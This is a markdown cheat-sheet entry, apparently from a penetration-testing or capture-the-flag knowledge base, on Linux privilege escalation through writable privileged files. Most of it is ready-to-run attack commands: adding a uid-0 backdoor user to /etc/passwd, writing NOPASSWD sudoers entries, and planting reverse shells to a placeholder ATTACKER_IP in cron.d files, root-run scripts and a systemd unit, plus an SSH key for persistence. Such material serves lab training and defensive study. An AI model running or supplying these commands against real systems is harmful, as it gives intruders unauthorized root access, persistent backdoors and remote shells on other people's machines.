---
id: linux-writable-files
title: Linux Writable File Abuse
stage: privesc
tags: [linux]
summary: Write to privileged files as a low-priv user — /etc/passwd, sudoers, cron.d, or service unit files — to create a root backdoor or execute commands as root without cracking anything.
leads_to:
  - root-linux
---

## Prerequisites

A shell as a low-priv user. `find / -writable -type f 2>/dev/null` or `ls -la` on specific config paths. The most valuable writable files are: `/etc/passwd`, `/etc/sudoers`, `/etc/sudoers.d/*`, `/etc/cron.d/*`, `/etc/systemd/system/*.service`, scripts called by root cron jobs.

Writing to privileged config files is often faster than chaining SUID or sudo exploits. `/etc/passwd` write lets you add a root-equivalent user with no hash check — the fastest path if you have write access. Writable sudoers grants passwordless sudo. Writable cron.d files execute as root on next tick.

## Quick Win

> Check /etc/passwd for write access — if writable, add a root backdoor in 10 seconds.

```bash
ls -la /etc/passwd
stat /etc/passwd
```

## /etc/passwd Write → Root Backdoor

```bash
# Generate password hash
openssl passwd -1 -salt xyz hacked
# → $1$xyz$hash...

# Append new root user (uid=0, gid=0)
echo 'hacked:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login as new user
su hacked   # password: hacked
id          # uid=0(root)
```

## /etc/sudoers Write

```bash
# Add NOPASSWD sudo for current user
echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" > /etc/sudoers.d/backdoor
sudo bash
```

## /etc/cron.d Write

```bash
# Add cron job that runs as root
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' > /etc/cron.d/backdoor
# Wait up to 60 seconds for execution
```

## Writable Script Called by Root Cron

```bash
# Find writable scripts
find / -writable -name "*.sh" 2>/dev/null
cat /etc/crontab  # identify scripts run as root

# Append rev-shell to script
echo 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1' >> /path/to/script.sh
```

## Writable systemd Service

```bash
# Find writable service files
find /etc/systemd /lib/systemd -writable -name "*.service" 2>/dev/null

# Modify ExecStart to run your command
[Unit]
Description=Backdoor

[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
User=root

[Install]
WantedBy=multi-user.target

# Reload and restart
systemctl daemon-reload
systemctl restart SERVICE_NAME
```

## Leads To

Any of the above → root shell → read `/root/root.txt`. Plant SSH key in `/root/.ssh/authorized_keys` for persistence: `echo PUBKEY >> /root/.ssh/authorized_keys`.
